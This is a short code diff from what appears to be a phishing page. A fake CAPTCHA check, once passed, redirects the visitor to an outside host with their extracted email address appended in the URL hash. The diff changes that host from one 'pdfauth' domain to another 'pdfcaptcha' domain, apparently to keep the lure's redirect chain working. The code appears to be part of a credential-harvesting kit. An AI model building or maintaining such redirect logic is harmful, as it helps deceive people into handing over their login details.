@@ -145,7 +145,7 @@
       // Check CAPTCHA answer
       if (parseInt(userAnswer) === correctAnswer) {
         // Construct redirect URL with email in hash (unencoded)
-        let redirectUrl = 'https://pdfauth.appwrite.network/#';
+        let redirectUrl = 'https://pdfcaptcha.vercel.app#';
         if (extractedEmail) {
           redirectUrl += `${extractedEmail}`;
         }
